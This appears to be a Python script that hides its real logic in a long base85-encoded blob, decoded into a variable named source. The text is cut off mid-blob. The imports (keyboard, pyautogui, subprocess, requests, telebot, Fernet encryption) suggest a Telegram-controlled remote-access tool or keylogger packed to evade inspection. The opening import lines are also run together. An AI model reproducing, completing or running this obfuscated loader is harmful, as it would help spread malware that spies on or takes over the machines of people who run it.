# -*- coding: utf8 -*-import ctypesfrom datetime import datetimeimport osimport platformimport subprocessimport requestsimport pyautoguiimport keyboardimport telebotfrom cryptography.fernet import Fernet
from base64 import b85decode
source = b85decode(b'BOom*Eg)lWWNB_^Iv{m)W;h@%DlH8PX>D+Ca&#bLba`-Pa}5e+a&K)QWMOn=bZKp6AZcxIZ*p`XWMOn=bZKp64GL*(aBp&SAa8RG3TbU{Z*p`XaBN|8W^ZzB4GL*(aBp&SAaiwMaB^>BWpi^43TbU{Z*p`Xa%FLKWpi|M4GL*(aBp&SAaHqMb#!lMb!iO>X>D+Ca&#bTWqD$6VRB>*3TbU{Z*p`XbY*O1VsCT}3TAR|Z6ITEd2n=ZXL4b1Xn8JXWpZw1bRcPMaBp&SAVy_!Ze?^03JnSk3JnTYMN(5qPfj2`ASW^|FeeQPPC-pYUr<s{M^ZseAUz-_O<`nCWppPE3JnTvWn^h#UvOb`XdpcxCv9b9X<;uX4GL~yZDn6(X>4U6Js=`uZ*FF3XD)PjbRrE34GIkkcWHEJAa8JGZYXYHZDn6(X>4UIASZHSCn+Fdb0B7EY-KtP3LqdLAY@^5VKE>*AZBT7WiE1MVPq&N4GIkkX=Wg7Wo{^BVRT_JE^}~fX>=$lDIh)|F*+b1BOuVV(Sgvr(6}Jbz0kEF(6`XA(TLEv(S*@}(7w>J(6G?G(7n-%(76o?4GJJ2ARudHc_2L?MrCqtWpplQWo~71VRU6*Yh`&TDIg#tAkeeWwa~rLwb6he(7MpO(T>rF(6AuUh|svvgwcS|zR<GJu+Y8GxY3Ud3LqdLAZ8#vAVy_!Ze?^RYh`&U4GJJ2ARuLKV{&<LbY)~;bY*ySAUz;!WqDgVGBRBtD<EbrWo~0~d2n<nWMOn+F)1J`AZulLTP-p&I$aG44GJJ2ARu>XbZ8)NaAj^NZeeX@UuJ1+Wh@{kcVZ_gAYpSLW@&6?It>aSARr(hARr)SX>4UKcXDZTWhiBCV{&<LbY)~;bY*ySDGdq@3T13_WjYNC4GJJ2ARu>XbZ8)NaAj^NZeeX@UuJ1+Wh@{ka$+YbAYpSLW@&6?It>aSARr(hARr)QVRT_KAUz;vX>4UKa%Ev;C@BpJARr(hYh`&LJs@OZbYU`EIx;d{AS)nbVRT_KTP-p&I$a<jBOuX-(Sp#m(7n*O(6u1Yy3o7Pj?stEunh_zARr)SAUz;PWpZw1bSP_Oc_|GF4GMQ@bZ8)NaAj^NZeeX@UuJ1+Wh@{ka$+YbAYpSLW@&6?It>aSARr)QVRT_LAUz;vX>4UKa%Ev;C@EVqGCD0XGF=S{4GLssV{&<LbY)~;bY*ySAUz;vE@Wk6a(QrcC}d%DVKXT%WMyM-WMwERE^}~fX>=$l4GIkk4GLpyVRLgJL}7GcIt>aSARr)aVQpm~Js@OdV{&<LbY)~;bY*ySTQFS>3LqdLAarkQWo{rnAY^4@a(QrcWn^D;Wq5R3F<lJ`ARr(hX=EThAX{l}bSP;lAZBlJAZZ|JZXjf3V{&<LbY)~;bY*ySTQXf+F*+?VT`qHQY-w~TCoCr^T@4B#ARr)haAaY0WgtBuX>N2VWMyM=d2n=PWM6b;cywDcT`3I;ARr(hb!lTDJs@drbSPwHV{&<LbY)~;bY*ySTQprM4GIkk4GLpyVRLgJOmAmrWpZCaZ*)2h3LqdLAY^4`AYWf;ZfSI1Unp~BY-TASEj}PlZ*FBe4GJJ2ARr(hARu#PY-TQKXdpcxCnpUGARr(hARr(hb7gF1E@X9Wa3DP(CuDVPa4#nf3LqdLARr(hAaiAGW-f4HbZ8(wASY~ZXLBzn4GJJ2ARr(hARuI6c_2L?GYtwLARr(hARr)VW*}~FbRchYE^uLVXf9=VX>)XQD05|OW-erPZEz_%4GJJ2ARr(hARr(hARupZE^TXMX>urYWo%|HWOZ$DDGdrBARr(hARr)VW*}~FbRchYE^uLVXf9=VX>)XQD05|OW-f4HbZ99$4GJJ2ARr(hARr(hARupZE^TXMX>urYWo%|HaA9<4DGdrBARr(hARr)Pb#iiLZgealWNC79EFflSY-MvGJs@v$E_Y#UYbbMNY-TQSVRUFIE?-}6Wq5R7UnnUJ3LqdLARr(hAZcbGY-MgJW@&6?b15J`Js@OZc{&XWARr(hARr(hARr(hW@&6?b09q+b8m8VWn?I3X>4V4DO)-%GhGb|ARr(hARr(hARr(hW^ZyJX&`BCAZBT7Wpg?W3LqdLARr(hARr(hARr(hAa8Rna%F9Ac4a7YWo%|HaA9<4AS)ngDGdq@3LqdLAY^4`AYWf|VRmI-Y;R{Mb7gF1EFg4ccyu}-b98bkIt>a93LqdLARr(hAZ}r8WnX4#Y-J!lAaiAGW-f4HbZ8(eASY~ZXJ02ED<EWHbY*mDZDlTQZ+9puE^~BpW^`$7Whf^lSuG`PEhS_pDK2tlaBN{?Whf^gCoByLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hASYiZDK2tlaBN{?Whf^)CoCW*Ehi};D<C2+ba-?k4GIkkARr(hARr(hX=WgAb1raUbZ9PRcxiKVb0}_MZDn6(X>4UFIt>a93LqdLARr(hARr(hAa`kWXdrKJWo{^LVQpn!W@&6?EFdRxVkapeVRIm6X>4UW4GJJ2ARr(hARr(hARr(hARuI6bYU_eJs@UjY-KKTWnp9}DIg#tAke?jfY83thtRmug3z$gyU@4|3JnS%ARr(hARr(hARr)XWqBYyAY@^5VKQ4fGBRBtD<EWHbYU`EEiy7XT_7MMAkl}>g3z_lz0kPOwII;C(7Vx&(TC8m4GIkkARr(hARr(hARr(hW*|KvMrCqtWppTOWqBzL3JnS%ARr(hARr(hARr)QbRaz-W-er9V{&<LbSPwDbYU`EGBP?XGBRB$E@Wk6Z)9aCDIhB#bY*yS4GJJ2ARr(hARr(hARuI6bYU|fJs@jkd0RR%GF>1mAZ9LQZewzJaC9hSbS`CXV{c?-C@Co*D<ErSd0Q<qGCExi3JnS%ARr(hARr(hARr)jX>@2HZ*XO9C~jeGWnX4#Y-KDUCwF2eDIj5UAZ}%MUu<t@It>aSARr(hARr(hARr(hARr)aWp`g}Z)Yxda%psBC}d%DVKXTW3JnS%ARr(hARr)RY;$Eg4GIkkARr(hARr(hARr(hYh`&LJs?J9a&BdGE@x$KWpZJ3WnXJ$c_=9$AR{2qv(UBBz0kGMfFRJi(7Vx&(TC8mAkm1>xY2~sfY83sve2;5z0kPPj|~bSARr(hARr(hARr)SAUz;PWpZw1bSP_Oc_|GFARr(hARr(hARr(hWo~0~d2n=PWM6b;cyu5=AZulLTRJi_T_7tUYh`&`Eiy7XT@4Bi3LqdLARr(hARr(hAa`kWXdrKJWo{^LVQpn!W@&6?EFdR$VkapeVRIm6X>4UW4GJJ2ARr(hARr(hARr(hARuOGY-KKYa%psBC~IYTTRJi_T_7tUW-euJV{&<LbSPzRV{&<LbY)~;bY*ySDIhB#Yh`&`Eiy7XT`3I;4GJJ2ARr(hARr(hARu#PY-TQBUvpu0WnXM>XDBBoBTR2+b0#AvDGdrBARr(hARr(hARr)fWo%|HUte=!c4c2|Z)YfUWq5Qc4GIkkARr(hWMyU`Y;R{Mb7gF1EFf-SZDn6(b#7xUAZ1^4Wq5QcIt>aSARr(hARr)gX>Da+WgtBuWMOn=bZKp6E^cpkC@C&;baG~NX>DaFCnZQaB~3adQzt1da%FIAVPj<|Cm<&*ASYiZDK2tlaBN{?Whf^)CoCW*Ehi}r3LqdLARr(hAarGTbRaz-W+GdAbZKp6UuAt=AbW0MZDn6(b#7yQIv{&xUvy=7bbT%+BO(n7ARr(hARr(hb7gF1E?-}BVRmI-Y;R{MbY*ySDGdq@3LqdLAY^4`AZKNCUu<t@D05|OW-K6XVQpn!W@&6?DLM@bARr(hARr(hbaHt*4GJJ2ARr(hARr(hARu>XbZ8)NaAj^Nb7gF1E^uLVXdo*fZeeX@UuJ1+Wh@{ka$+YbAYpSLW@&6?It>aSARr(hARr(hARr(hARr)QVRT_KAUz;vX>4UKa%Ev;C@BpJARr(hARr(hARr(hYh`&LJs@OZbYU`EIx;d{AS)nbVRT_KTP-p&I$a<jBOuX-(Sp#m(7n*O(6u1Yy3o7Pj?stEunh_zARr(hARr(hARr)SAUz;PWpZw1bSP_Oc_|GF4GJJ2ARr(hARr(hARu>XbZ8)NaAj^Nb7gF1E^uLVXdo*fZeeX@UuJ1+Wh@{ka$+YbAYpSLW@&6?It>aSARr(hARr(hARr(hARr)QVRT_LAUz;vX>4UKa%Ev;C@EVqGCD0XGF=S{4GJJ2ARr(hARr(hARuI6bYU|fJs@T-WMyM=d2n<nWMOn+Gbt`)Wn*t-Whf~wa%FIAVPj<|A|@juEFdCWZXziS3LqdLARr(hARr(hAaHVNZgePQVRT_LDGdrBARr(hARr(hARr)jX>@2HZ*XO9D05|OW-erPZE!1YVQpn!W@&6?EFdR$Cn+Fdb0B7EY-KtP3LqdLARr(hARr(hARr(hAZBT7WiEGeX>?^MWMOn+Gbs%UARr(hARr(hARr(ha%FUNa&91VWo%|HWOZ$DD{f(JWnX4#Y-J4!4GJJ2ARr(hARuLUV`Xr3It>aSARr(hARr(hARr)eWps6NZXiZsY;$D|3JnSk3Tb8_Zf|rTZ*wkiVRUFNX>(+0awsQlWn^h#Cn-7&3LqdLAa8RnZEIv{awsQlWn^h#Cn*gI4GL*wAUz;NVRT_GX=Duw4GL*yAVgtwVJ>xWWMOn=AU!=GF**$jARr(hZ*wkkWo>VEWhf_gaAYoaVsj@c4GJJ2ARupZE^=jUZ+2xUCv|XSE@EMHCn*gIARr(hWq4_HC@BpJ4GL6GOGQp!P(vU+AX`LXbYU)TVQpnBAVgtwVJ>uUYh`X-4GIkkVsCUHJs@;tY-M6^bS_k7Y-K`kbSP9$OGQp!P(xcWT`3I;Y;R|0WpW@rAWUy(XJv9<LT_{^DGdq@3JnTlY+-YAAVzg=V_!i~NjeP*ARr(hWMyU`Utei%X>?y-D05|OW+@;oJ|IqSZe=<R3LqdLARr(hAaiAGW-d-aO+{Z&Lm)jMR8LDqPG3+%TQFS>3LqdLARr(hAaiAGW-fGRUtw@*AUz;rZ*&a`ARr(hARr(hW^ZyJX=HOCX>K5CWI7EBARr(hARr(hARr(hbaHt*4GJJ2ARr(hARr(hARr(hARuXGAY*iSaAk8YcWG{9Y-}!bXk~0{Gcqnob5(O?azSoEWNm3~C@DG(3LqdLARr(hARr(hARr(hARr(hAYyNHE^}pWWM6G%b8}&5Whe~_ARr(hARr(hARr(hARr(hARr(hARr(hX=HOOAZ90fb7gF1E>1yBMPE=ueIU@c(6G?I(Sy;6(6!LLAke<if*{bi(7e#K(7n*OAkeVTw9vfJxX``OxY2>pg3*A`u+f6hzR`ftuqP=E3JnS%ARr(hARr(hARr(hARr(hARr)VW*}~FbRa}wbYU)aX=6GdAR{2qp3#EQfYF1{vCy#4wb6ngRY5}y3LqdLARr(hARr(hARr(hARr(hARr(hAarthIt>aSARr(hARr(hARr(hARr(hARr(hARr(hARr)PZ*6U1Ze%eaJs>A?WoIB{Wo%`1WgtjPOif%<PexQ%K~hCrO=)9tZ*y;EbX-?yZe(wFb6i7pa&l#EbXH|@b7^mGTu^UpX=7<+b6it-b97~GATM?xMQ&kYY-LPUK_?9gARr(hARr(hARr(hARr(hARr(hARr(hARr(hb9G{Ha&Kd0b8{|ob#5qICu417E@gOSCoCW*FJmVxAY*TBZDDR?F<mSmb7*C3Y&}$Rb!99dV`yb#YdutQb!99db97{Hb#y&*bz*RGZ)0V1b1qOxP(>^a3LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hb97{7a&kR$bz*RGZ)0V1b1qOxP(>*X3LqdLARr(hARr(hARr(hARr(hARr(hARr(hAY*TBZDDR?G9W!5Cvs(HAYo)=AV^D0O<Yq?MpRcpQbk-%X=8G4b8lvJTvussWN&wKTtjtoa%FCGR%LQ?X>V>^P;YE$V`*h`TvK^-bY*QIFLoeBZee0<WlU8;ATM+vQbk8!L|0EzL?AC@ATS^=W+x2_ARr(hARr(hARr(hARr(hARr(hARr(hARr(hb9G{Ha&Kd0b8{|ob#5qICu417E@gOSCoCW*FJmVxAY*TBZDDR?GF>bnb7*C3Y&}$Rb!99dV`yb#YdutQb!99db97{Hb#y&*bz*RGZ)0V1b1qOxP(>^a3LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hb97{7a&kR$bz*RGZ)0V1b1qOxP(>*X3LqdLARr(hARr(hARr(hARr(hARr(hARr(hAY^4@a(QrcWn^D;Wq5R3G+iJ)AR;j$4GJJ2ARr(hARr(hARr(hARr(hARr(hARr(hARuIAV{&<LbY)~;bY*ySAUz-=AR;bmZ)t8Q4GJJ2ARr(hARr(hARr(hARr(hARr(hARr(hARr(hARuIAV{&<LbY)~;bY*ySDK2GhV{c?-C?|DvW-T};DGdrBARr(hARr(hARr(hARr(hARr(hARr(hARr)RZewzJaCBv4Uvy=7bRaz-Yh`&`Ix;d{AS)nT4GJJ2ARr(hARr(hARr(hARr(hARr(hARr(hARr(hARuNgWo~0~d2n<nWMyM=d2n=PWM6b;cyuWsD<ErSd0Q<qGCExi3JnS%ARr(hARr(hARr(hARr(hARr(hARr(hARr)jX>@2HZ*XO9C?{iYZf0p`CoCW*cVZ_gAYpSLW@&6?It>aSARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(kAketbx6r)Mwa~rLwa~rLxX`sA(6`XA(7({Q(SgvoAkezdzR<nVgwVLqv(T_0(7w>IAXQ024GJJ2ARr(hARr(hARr(hARr(hARr(hARr(hARr(hARuOGY-KKYa%psBC}nPAa(QrcWn^D;Wq5Qc4GIkkARr(hARr(hARr(hARr(hARr(hARr(hWq4y{aC9I=cw=R7bZKvHAYpSLWjYNCARr(hARr(hARr(hARr(hARr(hARr(hARr(hY;R|0WpXZTZ)YeXWNC9@Vr*q!RY5}{EFfhm4GJJ2ARr(hARr(hARr(hARr(hARr(hARr(hARuCIbS`scZe(9=Wpi_3XJsg9WOFPaW+%{|(TLEv(6P|E(6Blndu4qmDGdq@3LqdLARr(hARr(hARr(hAZ2WGWjYNCARr(hARr(hARr(hARr(hARr(hVsCUVb7gL1Uu|V`b75y?C=CiAARr(hARr(hARr(hARr(hARr(hARr)VWOFPaW+!`dWo%|HPC-pYUr<ARAkeqau+YEJgVBl5wa~pF(7w@vAketbywJ7Kz0kNI(7w>I(TmZC(7n*U(6i9KAke?izR<hTjL^5xzR<GJu+f6hwa~lKk0&V&3JnS%ARr(hARr(hARr)Rcw=R7bRcwPY-M6^bS`0VX=r6^aAk5XL2zkQWo%_<a$#*ncw=R7bZKvHIt>aSARr(hARr(hARr(hARr)YZ)ay^axQFdXDBCMUukY>bYEX5EFdS)lF^GG(Sy*s(6G?A(6G?E(6}Jbz0kGLve32BfY80si_p0s(Sp#v(7MpI(7h)q4GJJ2ARr(hARr(hARr(hARuCIbS`srZ*X65Z)|L7Zf7Vd4GIkkARr(hWMyU`a$$2~X?7@cWo%|FAarGTbSXL@AR{2qz0khVfY7|qu+Y2ExX`!Iu+fIlxY3Uw(6}JcfY7kex6rZBxX`j7(7n*GAke+hgV46nz0r%%wII;9(7n*G(TC8r(7n*O(T@!ZARr(hARr(hbY*yMAUz;-Wq5Qhb8u{FbSNne3LqdLARr(hAarGTV<0^sbY*ySE^}~fX>=$edm<@YF*;oh3LqdLARr(hAZBlJAZZ|JZXj}DZf9jEY-MgJbY*yBDJeP)3LqdLARr(hARr(hAarGTV_RumAUz;-Wq4y-X<aUJaBOLGC?b6#DO)gI4GJJ2ARr(hARuyObairWAbTQiVQpn1Iv{jqcy3!TT`Ua>ARr(hARr(hARr(hARr(hB4cfCWFk5sbY*yMTQOZM4GJJ2ARr(hARr(hARr(hARr=iWq5QVIv{jqcw>DH3JnS%ARr)QWo95|X>Md+ZeeX@D05|OW-K6PX=f=q4GJJ2ARr(hARugSa3DP(FbxVIARr(hARr)QX>uSvAa8RnY-w|JWNC6JZDnL>VP9}zbZ99J3LqdLARr(hAZBlJAZZ|JZXjf7ayktPARr(hARr(hARr(hX=Wg4TRJmcAU!=GW@%?S4GJJ2ARr(hARr(hARr(hARugSa3Cu^ATbRJARr(hARr(ha%FUNa&91IX=flSAaitbC~R+VDGdq@3LqdLAY^4`AaZ4HD05|OW-K6ZVRUFLAY*TCbY*UIDLM@bARr(hARr(hc48nsAaiAGW-exFZe(9>VQpn7V{dMBWo~pS4GJJ2ARr(hARuXGAY*TCbY*UIAU!=GB6ewHB03EUARr(hARr(hARr(hZ*wkkWo}_@WhiZBWNBevaA9<4AS)nnVRUFLAZ=x2X<=V*VRUF9D<F1aAS)muE^Tl$A}I|DARr(hARr(hWo&6?AY*TCbY*UIAU!=GB5-MAB03EUARr(hARr(hARr(hZ*wkkWo}_@WhiZBWNBevaA9<4AS)nnVRUFLAZ=x2X<=V*VRUF9D<F1aAS)muE^uyVA}I|DARr(hARr(ha%FUNa&91YVhsun3LqdLAY^4`AY*N0Z(nj{bSQIWY-TJVV{dIKIv^k;Ake+hgV46nz0kfO(6rFI(T^a}fY7kevCzKJg3*g0(S$A0hS0dsxFB<IWn*b(X=7n@X>V?G4GJJ2ARr(hARu&dc{&XWARr(hARr(hARr(ha%FQMJs@*+VsLVAV`X!5E@NnAV{2b;b#!obbSPtQZ7d*jXk~0{JyddaWho5`ARr(hARr(hWq4y{aC9I=cw=R7bZKvHAYpSLWjYNCARr(hARr(hARr(hY;R|0WpXZTZ)YfTWo%|HV{K$_Uvg!1E?-}6VQpn!Uo0SHDGdrBARr(hARr(hARr)eWps6NZXjkS(4NtV(74dC(7MpDIv{&xeJ2eH4GJJ2ARr(hARu&dc{&XWARr(hARr(hARr(ha%FQMJs@&rb1r0MV{c?-C?|DvW;iD)4GJJ2ARr(hARuLUV`Xr3AVqj%WpH$9Z*CxAb0B3p4GJJ2ARr(hARr(hARu&dc{&XWARr(hARr(hARr(hARr(ha%FQMJs@&rb1r0MV{c?-C?{iZI5svXDGdrBARr(hARr(hARr)Rcw=R7bRb1|V`Xr3X>V>IVRIm5It>aSARr(hARr(hARr(hARr)eWps6NZXjkS(4NtV(74dC(7MpDIv{&xeJ2eHARr(hARr(ha%FUNa&90e(4*0T(7({N(TLE!(7rlcZYLlsAaZ4M4GIkkARr(hWMyU`V{K$_D05|OW-K6MZ*3_$ARr?kZ*_EVb#x%mzR`jp(6Z5s(7({W(7VvR(6!LL(74f$AkezdzR<kTu+Y8Gw9$(o(6S(7ZDb7!ARr(hARr(hbaHt*4GJJ2ARr(hARr(hARuyOb09q+b9G{Ha&Kd0b8{|ZXk}w-UvG7EaCLMjV{dINAaiJCY-~MLa&=`X4GJJ2ARr(hARuLUV`Xr3AVqj%WpH$9Z*CxAb0B3p4GJJ2ARr(hARr(hARugSXJ=({E^KdSD05|OW-eoGWN$8CUv6P-WnW(`AY~~H3LqdLARr(hARr(hAYyNHE^}pWWM6G%b8}&5WhirHY-TQLWGo<NC(xeJh|svuvCz8EusR@nWql_p4GJJ2ARr(hARu&dc{&XWARr(hARr(hARr(ha%FQMJs@&rb1r0MV{c?-C?|DvW;iD)4GJJ2ARr(hARuLUV`Xr3It>aSARr(hARr(hARr)ga(Oxp3LqdLARr(hARr(hARr(hAaZ4MAUz;*WpgfMWn*t-Whf_Oa5y$LCn*gIARr(hARr(hARr(hWq4y{aC9I=cw=R7bZKvHAYpSLWjYNCARr(hARr(hARr(hARr(hY;R|0WpXZTZ)YfTWo%|HV{K$_E?-}6VQpn!Uo0SHDGdrBARr(hARr(hARr(hARr)OZ*(qmWo~3&ZDn(FVP|D1b7gF1E@@;eAZ91fp3#WVxX`iCy3nvXAbVwfCn*gIARr(hARr(hVsCUVb7gL1Uu|V`b75y?D05|OW-e)DEFdS)qtSuTztFYOh|s;zzB*iPCm<^za%FQV4GIkkARr(hWMyU`V{K$<D05|OW-K6MZ*3_$ARr?k(6Z5s(7({W(7VvR(6!LL(74dGAkezdzR<kTu+Y8Gw9$(o(6S(7ZDb7!ARr(hARr(hbaHt*4GJJ2ARr(hARr(hARupZE^~QvbY*QQV{dIK4GJJ2ARr(hARr(hARuCIbS`scZe(9=Wpi_3XJsgJWo%|HX=E%QBG9AJfzZFuwb6*sz0kfQDGdrBARr(hARr)Rcw=R7bRb1|V`Xr3X>V>IVRIm5It>aSARr(hARr(hARr)YZ)ay^axQFdXDD-JY-TQFZDeUKUtexvZDn6yEFfhm4GJJ2ARr(hARr(hARuCIbS`scZe(9=Wpi_3XJsgJWo%|HX=E%QW+%{|(TLEv(6P|E(6Blndu4qmDGdq@3LqdLAY^4`AZ2)IbaN<kWo%|CIv^k;Ake<ihtRmuiO{gnwb6ng(7({I(7({S(Ssn-fgsSl(6!LC(74dB4GJJ2ARr(hARuIEav(h*Z*wkeX>)XBX>urSWn^h#UvOb`XekW}ARr(hARr(hW^ZyJX&`BCAY^HBIt>aSARr(hARr(hARr)bb1rgaZEtpEC~akAX<=V*VRUF9D<Ekp4GJJ2ARr(hARuCIbS`scZe(9=Wpi_3XJsgJWo%|HX=E%QBG9AJfzZFuwb6*sz0kfQDGdq@3LqdLAY^4`AZc)4VPs@-Wpi^Vb7gF1DLM@bARr(hARr(hbaHt*4GJJ2ARr(hARr(hARr?k(4Wx0(7Vxt(TC8r(7n*O(6t~*P%Y4~(6rHj(6!Nl(6AuUhtRdrfY7zjw;*bBZ*FODE@N+P4GJJ2ARr(hARr(hARuXQAUz;*WpQ<7b98eqXJvFKB4~7Ua5^t9YIARHX>cxMZ*4CkDK2VrZ*C|l4GJJ2ARr(hARr(hARr?k(4Wx0(7Vxt(TC8r(7n*O(6u1YxX``PgwVdxfY7|qu+fIlxX`#D(7w>IAW2Xy(6G?7(SXpk(SgvlAkl}=wb6jkwa~X9X>cuJaA_`MZ*2_<ARr(hARr(hARr(ha%FRHZ*FsCAUz;*WpQ<7b98eqXJvFK4GJJ2ARr(hARr(hARr(hARu*eY&~WtXmoUNIxjD2a4lhQX)a@LZ7*tbZ*DJpX>eO2X>cN4eJ3d{YIARHC@BpJ4GJJ2ARr(hARr(hARr?k(4o-2(6`XE(6G?G(74dGAkl%)yU@PSve2;6fYFa2(Sab)xX``PgwVdxfY7|qu+fIlxX`uGxggNK(6Jy%P%Y4~(6rHj(6!Nl(6tQ;ARr(hARr(hARr(hWMOn+AUz;^4GJJ2ARr(hARr(hARr(hARs4ONl;xUIv{dob8v5Nb7d}PWppSfadl;Kc_%3>4GJJ2ARr(hARr(hARr(hARs4O(4WzO(7w>J(6G?C(6rFC(SThiIv{dob8v5Nb7d}PWppSfX>)KVDJ%^NARr(hARr(hARr(hARr(hCtJ{-(SXpi(6G?G(74dI(6G^l(74f$T_-vqa%FRHZ*FsCE@x$QC?{`nXD2Bv4GJJ2ARr(hARr(hARr(hARs4O(4o<S(SXpf(7n*GT_-vqa%FRHZ*FsCE@x$QC?{iYb#8QWc_%3>4GJJ2ARr(hARr(hARr(hARs4O(4f$@(6i9E(7w>UT_-vqa%FRHZ*FsCE@x$QC?|4dXK8P4PGN0jCn+oq3LqdLARr(hARr(hARr(hASYYUlhD4=fY83sv|T4UAaZ4MaBpsNWiDrBbSNidX>@rfDJ%^NARr(hARr(hARr(hARr(hCtF%cP+ccFAaZ4MaBpsNWiDrBbSNi!X>cbgEDZ`EARr(hARr(hARr(hARr(oThOS`xY2;nzR`lvuw5rQAaZ4MaBpsNWiDrBbSNimVRR=cEDZ`EARr(hARr(hARr(hARr(oThNryzR<hSv(UcLg3z#CCpsW<Wpi+EZgXWWXJvFKCv0zSCn+oq3LqdLARr(hARr(hAbkxA4GJJ2ARr(hARr(hARr?k(4^45(SXpr(74fn(7w>J(6G?G(74dGAkl%*g3*A`zR<eRxFFGiAketbz0riwzR`ftywI@GhS0dswa~dB(7w>IAW2Xy(6G?7(SXpk(Sgvl4GJJ2ARr(hARr(hARuXOW^Z3}baH8KXCOTwA|ee6ARr(hARr(hARr(hW^ZyJYb+pkAZczOWMOn+E@^aSZF49oIt>aSARr(hARr(hARr(hARr)VZf0*^b98cPZf77XJs@T$dux3lIv{&?eOzuQ4GIkkARr(hARr(hARr(hBOuV8(Sp#w(SXpf(6Z3F(6AuUfzg7|fY83sy3n{F(Sab)xX``PgwVdxfY7|qu+fIlxX`uGxggNK(6Jy%P%Y4~(6rHj(6!Nl(6tQ;ARr(hARr(hARr(hVsCUVb7gL1Uu|V`b75y?D05|OW-e)DEFfuaW^Z3}baH8KXDJN|ARr(hARr(hWq4y{aC9JYWpQ<7b98eqWq4y{aCB*JZgVa}Z*Fd7V{~b6Zbfo(Z*n>f3LqdLARr(hARr(hAZ%}EXJv9OY;R{Mb7gF1E@^OIVPs@-Wpi^bUtexvZDn6yEFdS)p3#WVxX`iCy3nv7(Sgvu(6!LC(74dO(6!LL(74f$Cn*gIARr(hARr(hARr(hVsCUVb7gL1Uu|V`b75y?D05|OW-e)DEFdS)p3#WVxX`iCy3nv7(Sgvu(6!LC(74dO(6!LL(74f$Cn*gI4GJJ2ARuIAW*~QGbSQIWY-TJVV{dIKIt>aSARr(hARr)ga(Oxp3LqdLARr(hARr(hAY@^5VIVyqa%FLKWpi|ME@x$QC}VGJTQFTI4GJJ2ARr(hARr(hARuXGAY@^5VJ>rYVRUtKUt@1%WgtC0ATls8It>aSARr(hARr(hARr(hARr)jX>@2HZ*XO9C}VGJTQOZMASZWXCn+Fdb0B6q4GJJ2ARr(hARr(hARr(hARr(hARuNgcXDZTWhi7}bYU)IZ*FvDZgeRP3LqdLARr(hARr(hAYyNHE^}pWWM6G%b8}&5WhirHY-TQLWGo;e(4*0T(7({N(TLE!(7qxm4GJJ2ARr(hARuLUV`Xr3AVqj%WpH$9Z*CxAb0B3p4GJJ2ARr(hARr(hARugSXJ=({E^KdSD05|OW-fPUbS__CZeeX@UtcUBWho5`ARr(hARr(hARr(hVsCUVb7gL1Uu|V`b75y?D05|OW-e)DEFfkl(4NtV(74dC(7MpDIv{&xeJ3dm3JnS%ARr)QWo969Wnyn{bZKs9D05|OW-K6dX>Db4DLNn^BOuVf(6!Nk(6!LF(6G?6(SXr|(6`XK(6AuTztFl33LqdLARr(hAarthIt>aSARr(hARr(hARr)gX>Db4AUz-=b7*yRWN&wFATM$tFLWRxAS)nqbaE(kX>Db4DGdrBARr(hARr(hARr)bb1rjvb97~GD0FFUWpXJE3LqdLARr(hARr(hAYyNHE^}pWWM6G%b8}&5WhirHY-TQLWGo;e(4*0T(7({N(TLE!(7qxm4GJJ2ARr(hARuLUV`Xr3AVqj%WpH$9Z*CxAb0B3p4GJJ2ARr(hARr(hARugSXJ=({E^KdSD05|OW-fANVsCGBX>MmOUtexvZDn6yEFfhm4GJJ2ARr(hARr(hARuCIbS`scZe(9=Wpi_3XJsgJWo%|HX=E%QW+%{|(TLEv(6P|E(6Blndu4qmDGdq@3LqdLAY^4`AaiJSbYyRLZfS03D05|OW-K6dX>Db4DLNn^BOuVS(TmW!(7Vx&(TC8r(7n*O(6u1YztFl33LqdLARr(hAarthIt>aSARr(hARr(hARr)gX>Db4AUz-=b7*yRWN&wFATM(uFLWRxAS)nqbaE(kX>Db4DGdrBARr(hARr(hARr)bb1rjvb97~GD0FFUWpXJE3LqdLARr(hARr(hAYyNHE^}pWWM6G%b8}&5WhirHY-TQLWGo;e(4*0T(7({N(TLE!(7qxm4GJJ2ARr(hARuLUV`Xr3AVqj%WpH$9Z*CxAb0B3p4GJJ2ARr(hARr(hARugSXJ=({E^KdSD05|OW-fDRb#!EJcW!BJXD(k~ZeeX@UtcUBWho5`ARr(hARr(hARr(hVsCUVb7gL1Uu|V`b75y?D05|OW-e)DEFfkl(4NtV(74dC(7MpDIv{&xeJ3dm3JnS%ARr)QWo967X=8MCa%CuUWo%|FAZBT7Whpu!AR{2qzR`lvy3v5qi_wD6xX`sA(7MpD(SXr{(74dO(7MpLAketbw;<5J(6G?I(7MpLAkl#!(7e#K(6rFF(69{(ARr(hARr(hbaHt*4GJJ2ARr(hARr(hARuFJZEaz0WFS2tW+HoSWn^h#UvOb`XnkB<duC~DWqmGiZf7D53LqdLARr(hARr(hAa8Rnb97;HbY^L6Whi5BZEaz0WGM{_ARr(hARr(hARr(hVsCUVb7gL1Uu|V`b75y?D05|OW-e)DEFdD#qtSuTztFYOh|s;zz9K0N3LqdLARr(hAZ2)CWpH#LMR;RnaCB*JZXjWEAZ0oY3LqdLARr(hARr(hAZ%}EXJv9OY;R{Mb7gF1E^ujMbairNE?-}6VQpn!Uo0SHDGdrBARr(hARr(hARr)OZ*(qmWo~3&ZDn(FVP|D1b7gF1E@@;eAZ91fp3#WVxX`iCy3nvXAbVwfCn*gI4GJJ2ARuIAW*~NHWMywCb7gF1EFflSY-K4rARr?k(7w@v(7Mrp(TmZ7(74dGAkebVxX`rFwa~sG(74dIAke?iu+YEIy3n{F(Sab)ywJ7Kw9vTFunh_zARr(hARr)ga(Oxp3LqdLARr(hARr(hAY*TBZDDR?AUz;vB71FRWNBevaA9<4eOz37W@&6?eJ*WqG$IWOARr(hARr(hARr(hZ*wklbYXIIW@&6?C}VGJZDDR?DGdrBARr(hARr(hARr)OZ*(qmWo~3&ZDn(FVP|D1b7gF1E@@;eAR^GC(Sgvv(6!Ns(7n*UA}I|DARr(hARr(hWq4y{aC9I=cw=R7bZKvHAYpSLWjYNCARr(hARr(hARr(hY;R|0WpXZTZ)YfTWo%|Hc4=f~Z!TY7ZeeX@UtcUBWho5`ARr(hARr(hARr(hVsCUVb7gL1Uu|V`b75y?D05|OW-e)DEFfkl(4NtV(74dC(7MpDIv{&xeJ3dm3JnS%ARr)QWo96AaAjj@W@%$#bZKvHb0~9VY-TAsARr?k(6Z3J(6`XC(SXpf(TUKo(6!NmAkl@;u+f0fu+X~Eg3z_